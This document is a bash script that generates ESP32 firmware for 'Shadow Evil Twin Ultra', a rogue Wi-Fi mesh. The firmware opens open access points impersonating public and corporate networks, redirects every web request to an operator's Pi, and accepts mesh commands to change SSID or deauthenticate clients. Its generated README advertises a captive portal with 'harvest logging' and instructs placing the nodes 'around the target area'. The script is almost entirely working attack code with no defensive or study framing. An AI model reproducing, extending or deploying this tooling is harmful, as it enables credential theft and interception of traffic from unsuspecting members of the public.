#!/bin/bash
# Shadow Evil Twin Ultra - ESP32 Mesh Node Generator with Full Command Channel

set -euo pipefail

SSIDS="BostonFreePublicWiFi,StateStreet_Guest"
MAIN_IP="10.0.0.1"
NODES=4
OUTDIR="$(dirname "$0")"

MESH_PREFIX="ShadowMesh"
MESH_PASS="shadowmesh2026"
MESH_PORT=5555

while [[ $# -gt 0 ]]; do
    case $1 in
        --ssids) SSIDS="$2"; shift 2 ;;
        --main-ip) MAIN_IP="$2"; shift 2 ;;
        --nodes) NODES="$2"; shift 2 ;;
        --outdir) OUTDIR="$2"; shift 2 ;;
        --standalone-cyd) STANDALONE_CYD=1; shift ;;
        *) shift ;;
    esac
done

mkdir -p "$OUTDIR"

echo "[esp32] Generating $NODES nodes..."

IFS=',' read -ra SSIDARR <<< "$SSIDS"

if [ "${STANDALONE_CYD:-0}" = "1" ]; then
    echo "[esp32] STANDALONE CYD mode: copying enhanced firmware.ino as standalone-cyd.ino"
    cp "$(dirname "$0")/firmware.ino" "$OUTDIR/standalone-cyd.ino" 2>/dev/null || echo "  (using current firmware.ino as template)"
    echo "  → $OUTDIR/standalone-cyd.ino (CYD full standalone evil twin + mesh + TFT UI)"
    exit 0
fi

for i in $(seq -w 1 "$NODES"); do
    NODE_NAME="${MESH_PREFIX}-Node${i}"
    OUTFILE="$OUTDIR/${NODE_NAME}.ino"
    
    S1="${SSIDARR[0]}"
    S2="${SSIDARR[1]:-Shadow-Node-$i}"
    
    cat > "$OUTFILE" << 'INOEOF'
/*
 * Shadow Evil Twin Ultra v3.6 — ESP32 Mesh Node with Full Command Channel
 * Supports dynamic SSID change from main Pi
 * Compatible with ESP32-S3 and CYD-ESP32-3248S035
 */

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include "painlessMesh.h"

#define MESH_PREFIX     "ShadowMesh"
#define MESH_PASSWORD   "shadowmesh2026"
#define MESH_PORT       5555

painlessMesh mesh;
AsyncWebServer server(80);

String current_ssid = "__S1__";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);

  mesh.init(MESH_PREFIX, MESH_PASSWORD, MESH_PORT);
  mesh.onReceive([](uint32_t from, String &msg) {
    Serial.printf("Mesh command from %u: %s\n", from, msg.c_str());
    
    if (msg.startsWith("ssid:")) {
      current_ssid = msg.substring(5);
      WiFi.softAPdisconnect(true);
      WiFi.softAP(current_ssid.c_str(), "", 6, 0, 8);
      Serial.println("SSID changed to: " + current_ssid);
    } else if (msg == "deauth") {
      Serial.println("Deauth command received - not implemented in basic node");
    }
  });

  // Initial Rogue AP
  WiFi.softAP(current_ssid.c_str(), "", 6, 0, 8);

  // Redirect all traffic to main Pi
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("http://__MAIN_IP__");
  });

  server.begin();
  Serial.printf("[ShadowMesh] Node ready. Current SSID: %s\n", current_ssid.c_str());
}

void loop() {
  mesh.update();
  delay(10);
}
INOEOF

    sed -i "s|__S1__|$S1|g" "$OUTFILE"
    sed -i "s|__MAIN_IP__|$MAIN_IP|g" "$OUTFILE"
    echo "  → $OUTFILE"
done

cat > "$OUTDIR/README.md" << EOF
# ShadowMesh ESP32 Nodes

Generated for Shadow Evil Twin Ultra

## Usage
Normal (mesh redirector): ./generate.sh --ssids "BostonFreePublicWiFi,..." --nodes 4
Standalone CYD: ./generate.sh --standalone-cyd

## Features (standalone-cyd)
- Full captive portal served locally on the CYD
- TFT + touch operator UI (status, cycle SSID, mesh commands)
- Local harvest logging (LittleFS + Serial)
- PainlessMesh command channel (SSID change + deauth)
- Self contained for burning directly to ESP32-3248S035R

## Flashing
- CYD: Use Arduino IDE + TFT_eSPI configured for your board + painlessMesh + ESPAsyncWebServer + XPT2046 libs.
- Flash standalone-cyd.ino or the generated Node .ino

Flash and power the nodes around the target area.
EOF

echo "[esp32] Generation complete."